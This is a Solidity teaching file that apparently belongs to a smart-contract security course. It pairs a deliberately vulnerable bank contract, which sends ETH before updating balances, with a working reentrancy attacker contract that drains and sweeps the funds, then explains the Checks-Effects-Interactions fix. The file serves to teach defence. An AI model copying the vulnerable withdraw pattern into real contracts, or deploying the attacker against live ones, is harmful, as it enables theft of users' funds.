// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*
Reentrancy Vulnerability and Exploit Demo
Maps to syllabus: Security Best Practices -> Reentrancy protection

This file contains:
- VulnerableBank: a deliberately vulnerable contract that allows reentrancy
- Attacker: a contract that exploits the vulnerability

Do NOT deploy VulnerableBank to a public network. Use only for local/testing.

How to run (Hardhat quick notes):
1) Copy these contracts to your Hardhat project's contracts/ folder
2) npx hardhat compile
3) Write a small script to deploy VulnerableBank and Attacker
4) Fund VulnerableBank with ETH, then run attacker.attack()
*/

/// @title VulnerableBank - intentionally vulnerable to reentrancy
/// @notice Demonstrates the "interactions-before-effects" anti-pattern
contract VulnerableBank {
    mapping(address => uint256) public balances;

    event Deposit(address indexed from, uint256 amount);
    event Withdraw(address indexed to, uint256 amount);

    // Accept ETH deposits and update internal accounting
    function deposit() external payable {
        require(msg.value > 0, "no value");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    // Vulnerable withdraw: sends ETH to caller BEFORE updating storage
    // Attacker can re-enter via receive()/fallback and drain funds
    function withdrawAll() external {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "nothing to withdraw");

        // INTERACTION (external call) before EFFECT (state update) -> VULNERABLE
        (bool ok, ) = msg.sender.call{value: bal}("");
        require(ok, "send failed");

        // State update happens after the external call, enabling reentrancy
        balances[msg.sender] = 0;

        emit Withdraw(msg.sender, bal);
    }

    // Helper: check an account's tracked balance
    function balanceOf(address a) external view returns (uint256) {
        return balances[a];
    }

    // Helper: contract balance
    function totalEther() external view returns (uint256) {
        return address(this).balance;
    }
}

/// @title Attacker - exploits VulnerableBank reentrancy
/// @notice For demonstration; never deploy to public networks
contract Attacker {
    VulnerableBank public immutable target;
    address public owner;
    bool private reentered;

    event AttackStarted(uint256 initialDeposit);
    event Received(uint256 amount);
    event AttackFinished(uint256 attackerBalance);

    error NotOwner();

    modifier onlyOwner() {
        if (msg.sender != owner) revert NotOwner();
        _;
    }

    constructor(address _bank) {
        owner = msg.sender;
        target = VulnerableBank(payable(_bank));
    }

    // Start the attack by depositing, then triggering withdrawAll
    function attack() external payable onlyOwner {
        require(msg.value > 0, "need ETH to seed attack");
        // Deposit to the bank
        target.deposit{value: msg.value}();
        emit AttackStarted(msg.value);

        // Trigger vulnerable withdraw
        target.withdrawAll();
        // After reentrancy completes, attacker contract should hold drained ETH
        emit AttackFinished(address(this).balance);
    }

    // Reentrancy happens here: on receiving ETH from bank, call withdrawAll again
    receive() external payable {
        emit Received(msg.value);
        // Re-enter only once (or a few times) to avoid out-of-gas loops during demos
        if (!reentered) {
            reentered = true;
            // Call back into the bank BEFORE our balance is set to 0 in the bank's storage
            target.withdrawAll();
        }
    }

    // Withdraw funds from attacker contract to EOA
    function sweep(address payable to) external onlyOwner {
        to.transfer(address(this).balance);
    }
}

/* Explanation

What goes wrong?

- VulnerableBank.withdrawAll():
  1) Reads balances[msg.sender] -> bal
  2) Sends ETH to msg.sender via low-level call (external interaction)
  3) Then sets balances[msg.sender] = 0 (effect)
- Because the external call occurs before the state update, msg.sender's receive()
  can execute arbitrary code and re-enter withdrawAll(), reading the same old balance
  again and again, draining the bank.

Key takeaways:
- Always follow Checks-Effects-Interactions (CEI)
  * Check: validate inputs, read necessary state
  * Effects: update your contract's state
  * Interactions: call external contracts/addresses LAST
- Prefer using reentrancy guards for extra safety (see ReentrancyFixed.sol)
- Avoid using call() to arbitrary addresses when not necessary; if used, ensure CEI
- Limit gas forwarded to external calls when possible (though not sufficient alone)

See also:
- Fixed pattern example: lessons/advanced/security/ReentrancyFixed.sol
*/